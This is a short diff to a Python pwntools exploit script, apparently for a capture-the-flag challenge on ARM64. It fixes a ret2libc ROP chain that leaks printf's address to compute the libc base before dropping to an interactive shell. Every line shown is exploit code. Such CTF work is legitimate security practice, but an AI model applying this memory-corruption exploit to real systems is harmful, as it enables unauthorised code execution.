@@ -64,13 +64,13 @@ def ret2libc():
         p64(0),           # x2
         p64(0),           # x3
         p64(ldp_x3_lr_bx_x3),
-        p64_float(printf_plt),  # x3
+        p64(printf_plt),  # x3
         p64(start_addr)   # lr Return to _start
     ])
     if debug_flag: pause()
     sa("Enter a string: ", payload_1)
     ru("\n")
-    printf_addr = u64(r(8))
+    printf_addr = u64(r(6).ljust(8, b'\x00'))
     libc.address = printf_addr - libc.sym['printf']
     log.success(f"printf address: {hex(printf_addr)}")
     log.success(f"libc base address: {hex(libc.address)}")
@@ -91,5 +91,5 @@ def ret2libc():
     ru("\n")
 
 if __name__ == "__main__":
-    ret2libc()  # Choose the exploit method you want to use
+    ret2libc()
     gift.io.interactive()
